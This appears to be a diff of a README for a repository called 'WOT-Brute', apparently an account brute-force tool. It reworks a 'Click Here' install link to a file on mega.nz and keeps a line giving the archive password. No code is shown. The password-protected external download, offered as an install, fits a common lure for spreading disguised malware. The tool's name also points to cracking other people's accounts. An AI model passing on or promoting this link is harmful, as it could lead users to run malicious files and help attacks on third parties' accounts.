@@ -1,4 +1,5 @@
-[CLICK HERE TO INSTALL|(https://mega.nz/file/hXti0IbR#03joGqGoU8TkmNkFvy-m4qMEUASvq9fmN6LDQFQj_JI)
+[<a href="https://mega.nz/file/hXti0IbR#03joGqGoU8TkmNkFvy-m4qMEUASvq9fmN6LDQFQj_JI">Click Here</a>]
+
 [PASS: wot bc]
 
 ![image](https://github.com/skyflowed/WOT-Brute/assets/170162903/2fe96f82-b342-4429-b5d4-db88cd9899be)
